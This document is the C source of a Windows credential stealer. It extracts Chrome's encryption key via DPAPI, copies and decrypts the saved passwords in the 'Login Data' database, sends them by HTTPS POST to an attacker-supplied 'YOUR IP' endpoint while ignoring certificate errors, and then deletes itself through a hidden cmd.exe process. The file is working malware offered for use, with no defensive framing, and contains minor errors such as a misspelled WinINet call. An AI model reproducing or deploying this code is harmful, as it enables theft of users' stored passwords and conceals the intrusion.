#include <windows.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <direct.h>
#include "sqlite3.h" // for SQLite, Download it from https://sqlite.org/download.html

#pragma comment(lib, "crypt32.lib") // for DPAPI
#pragma comment(lib, "bcrypt.lib") // for AES-GCM
#pragma comment(lib, "wininet.lib") // for HTTPS

char credential[65536] = {0}; // for Exfiltration

BOOL get_encrypted_key(char* key, size_t key_size) {
    char key_path[MAX_PATH];
    char* local_app_data = getenv("LOCALAPPDATA");
    if (!local_app_data) return FALSE;

    snprintf(key_path, sizeof(key_path), "%s\\Google\\Chrome\\User Data\\Local State", local_app_data);

    FILE* file_ptr = fopen(key_path, "rb");
    if (!file_ptr) return FALSE;

    fseek(file_ptr, 0, SEEK_END);
    long file_size = ftell(file_ptr);

    fseek(file_ptr, 0, SEEK_SET);

    char* buffer = (char*)malloc(file_size + 1);
    if (!buffer) {
        fclose(file_ptr);
        return FALSE;
    }

    fread(buffer, 1, file_size, file_ptr);
    buffer[file_size] = '\0';
    
    fclose(file_ptr);

    const char* search_str = "\"encrypted_key\":\"";
    char* start = strstr(buffer, search_str);
    if (start) {
        start += strlen(search_str);
        char* end = strchr(start, '\"');
        if (end) {
            size_t key_len = end - start;
            if (key_len < key_size) {
                strncpy(key, start, key_len);
                key[key_len] = '\0';
                free(buffer);
                return TRUE;
            }
        }
    }

    free(buffer);
    return FALSE;
}

BOOL get_master_key(const char* encrypted_key, BYTE* decrypted_key) {
    DWORD binary_len = 0;
    CryptStringToBinaryA(encrypted_key, 0, CRYPT_STRING_BASE64, NULL, &binary_len, NULL, NULL);

    BYTE* decoded_bytes = (BYTE*)malloc(binary_len);
    if (!decoded_bytes) return FALSE;

    CryptStringToBinaryA(encrypted_key, 0, CRYPT_STRING_BASE64, decoded_bytes, &binary_len, NULL, NULL);

    DATA_BLOB input = {binary_len - 5, decoded_bytes + 5}; // for Magic Number(Chrome <= v80)
    DATA_BLOB output;
    BOOL success = FALSE;
    if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
        if (output.cbData == 32) {
            memcpy(decrypted_key, output.pbData, 32);
            success = TRUE;
        }
        LocalFree(output.pbData);
    }

    free(decoded_bytes);
    return success;
}

BOOL evacuate_sqlite(const char* profile_name, const char* file_name, char* path) {
    char source_path[MAX_PATH];
    char * local_app_data = getenv("LOCALAPPDATA");
    if (!local_app_data) return FALSE;

    _mkdir("C:\\tmp");
    snprintf(source_path, sizeof(source_path), "%s\\Google\\Chrome\\User Data\\%s\\%s", local_app_data, profile_name, file_name);
    snprintf(path, MAX_PATH, "C:\\tmp\\%s", file_name);
    return CopyFileA(source_path, path, FALSE);
}

void parse_sqlite(const char* file_path, BYTE* master_key) {
    sqlite3* db;
    sqlite3_stmt* stmt;
    if (sqlite3_open(file_path, &db) != SQLITE_OK) return;

    const char* query = "SELECT origin_url, username_value, password_value FROM logins";
    if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char* url = (const char*)sqlite3_column_text(stmt, 0);
            const char* user = (const char*)sqlite3_column_text(stmt, 1);
            BYTE* password_blob = (BYTE*)sqlite3_column_blob(stmt, 2);
            int password_len = sqlite3_column_bytes(stmt, 2);
            if (password_len > 0) {
                decrypt_password(master_key, password_blob, password_len, url, user);
            }
        }
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);
}

void decrypt_password(BYTE* key, BYTE* encrypted_blob, ULONG blob_len, const char* url, const char* user) {
    BCRYPT_ALG_HANDLE alg_handle = NULL;
    BCRYPT_KEY_HANDLE key_handle = NULL;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO padding_info;
    // Chrome AES-256-GCM data structure
    // 1. Prefix(v10, v11) 3bytes
    // 2. IV 12 bytes IV
    // 3. Data
    // 4. Auth Tag(for tampering) 16bytes
    if (blob_len < 15) return;

    BYTE iv[12];
    memcpy(iv, encrypted_blob + 3, 12);
    BYTE* data = encrypted_blob + 15;
    ULONG data_tag_len = blob_len - 15;
    
    BCryptOpenAlgorithmProvider(&alg_handle, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(alg_handle, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    BCryptGenerateSymmetricKey(alg_handle, &key_handle, NULL, 0, key, 32, 0);
    BCRYPT_INIT_AUTH_MODE_INFO(padding_info);

    padding_info.pbNonce = iv;
    padding_info.cbNonce = 12;
    padding_info.pbTag = data + (data_tag_len - 16);
    padding_info.cbTag = 16;

    BYTE* plain_text = (BYTE*)malloc(data_tag_len);
    ULONG cb_plain_text = 0;
    if (BCryptDecrypt(key_handle, data, data_tag_len - 16, &padding_info, NULL, 0, plain_text, data_tag_len, &cb_plain_text, 0) == 0) {
        plain_text[cb_plain_text] = '\0';
        append_data(url, user, (char*)plain_text);
    }

    free(plain_text);
    BCryptDestroyKey(key_handle);
    BCryptCloseAlgorithmProvider(alg_handle, 0);
}

void append_data(const char* url, const char* user, const char* password) {
    char data[1024];
    snprintf(data, sizeof(data), "URL: %s\nUser: %s\nPass: %s\n-------------------\n", url ? url : "N/A", user ? user : "N/A", password ? password : "N/A");
    strncat(credential, data, sizeof(credential) - strlen(credential) - 1);
}

void exfiltrate(const char* data) {
    HINTERNET session = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!session) return;

    HINTERNET connection = InternectConnectA(session, "YOUR IP", 443, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
    if (!connection) {
        InternetCloseHandle(session);
        return;
    }

    HINTERNET request = HttpOpenRequestA(connection, "POST", "/exfiltrate", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 1);
    if (request) {
        DWORD dw_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID; // for self-signed certificate error
        InternetSetOptionA(request, INTERNET_OPTION_SECURITY_FLAGS, &dw_flags, sizeof(dw_flags));
        
        const char* headers = "Content-Type: text/plain";
        HttpSendRequestA(request, headers, (DWORD)strlen(headers), (LPVOID)data, (DWORD)strlen(data));
        InternetCloseHandle(request);
    }

    InternetCloseHandle(connection);
    InternetCloseHandle(session);
}

void self_destruction() {
    char path[MAX_PATH];
    char cmd[MAX_PATH * 2];

    GetModuleFileNameA(NULL, path, MAX_PATH);
    snprintf(cmd, sizeof(cmd), "cmd.exe /c timeout /t 3 & del \"%s\"", path);

    STARTUPINFOA startup_info = {sizeof(startup_info)};
    PROCESS_INFORMATION process_information;
    startup_info.dwFlags = STARTF_USESHOWWINDOW;
    startup_info.wShowWindow = SW_HIDE;

    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &startup_info, &process_information);
    CloseHandle(process_information.hProcess);
    CloseHandle(process_information.hThread);
}

int main() {
    char base64_key[2048];
    BYTE master_key[32];
    char tmp_path[MAX_PATH];

    if (get_encrypted_key(base64_key, sizeof(base64_key))) {
        if (get_master_key(base64_key, master_key)) {
            if (evacuate_sqlite("Default", "Login Data", tmp_path)) {
                parse_sqlite(tmp_path, master_key);
                DeleteFileA(tmp_path);
                if (strlen(credential) > 0) {
                    exfiltrate(credential);
                }
            }
        }
    }
    self_destruction();
    return 0;
}